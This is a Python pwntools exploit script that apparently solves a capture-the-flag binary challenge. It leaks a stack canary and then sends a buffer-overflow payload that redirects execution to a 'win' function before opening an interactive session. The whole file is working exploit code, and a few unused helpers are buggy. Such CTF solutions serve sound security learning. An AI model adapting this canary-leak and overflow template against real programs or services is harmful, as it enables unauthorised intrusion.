#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13377

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        break *0x4014cc
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e):
    sla(io, b"operand:", b"pi")
    sla(io, b"use:", b"11000")
    alice = io.recvline()
    alice = alice.split(b"\x00")
    canary = b"\x00" + alice[8][:7] # this will sometimes not work, depending on if the canary has more than one null byte
    canary = int.from_bytes(canary, "little")

    print(f"Canary: {hex(canary)}")

    sla(io, b"operator:", b"+")
    sla(io, b"operand:", b"0")

    win = 0x4012f6
    ret = 0x40101a
    payload = b"A"*0x28 + p64(canary) + b"A"*8 + p64(ret) + p64(win)

    sla(io, b"here:", payload) 

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
